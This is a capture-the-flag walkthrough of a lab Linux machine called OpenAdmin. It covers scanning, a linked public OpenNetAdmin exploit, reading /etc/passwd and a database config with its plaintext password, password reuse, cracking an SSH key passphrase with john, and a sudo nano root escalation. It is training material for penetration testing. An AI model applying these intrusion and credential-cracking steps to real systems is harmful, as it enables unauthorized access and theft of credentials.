# OpenAdmin

## Overview 

OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.

## Initial Recon

```
nmap -p 1-10000 -sV -sS --version-intensity 9 -T4 -Pn $IP
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 15:24 UTC
Nmap scan report for 10.10.10.171
Host is up (0.19s latency).ob
Not shown: 9998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.55 seconds
```

## User flag

### Port 80

```
dirb http://$IP
```

`/artwork` -> not interesting
`/music` -> login page redirect to `/ona` which is OpenNetAdmin, we see a version number: `v18.1.1`
`/server-status` -> forbidden

### OpenNetAdmin

Quickly we find a known exploit for the version v18.1.1: https://www.exploit-db.com/exploits/47691

Running this exploit gives us a shell as `www-data`.

```
cat /etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

Two users are interesting: `jimmy` and `joanna`, this is confirmed by a simple `ls /home` showing us the two users home directories.

After some enumeration, we find a database config file `local/config/database_settings.inc.php` with the following content:

```php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

Luckily, the database password is the same as jimmy's password `n1nj4W4rri0R!`.

### SSH

```
cat /etc/apache2/sites-enabled/internal.conf
```

```
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

The files of the internal web app are writable by our current user so we can just remove the authentication to access the main.php file printing joana's rsa key. However the `index.php` file is interesting and contains an hardcoded hash in the authentication process.

```
00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1
````

Using https://hashes.com/en/decrypt/hash we find the cleartext password: `Revealed`.

Now we need to crack the passphrase of the private key we got earlier.

```
ssh2john joana_id_rsa > johnidrsa
```
```
john --wordlist=/usr/share/john/rockyou.txt --format=SSH johnidrsa
```
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joana_id_rsa)
```

We found the private key and the passphrase is `bloodninjas`.
Now we can login with ssh as `joanna` using the private key and the passphrase.

```
ssh -i joana_id_rsa joanna@$IP
```

The user.txt flag is in the `joanna` home directory.

## Privilege Escalation

### Sudo

As joanna user, we can see in /etc/sudoers.d that the file `joanna` allows us to run nano as root.

```
cat /etc/sudoers.d/joanna
```
```
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
```

Using https://gtfobins.github.io/gtfobins/nano/#sudo we have different options to escalate our privileges.

The root flag is in `/root/root.txt`.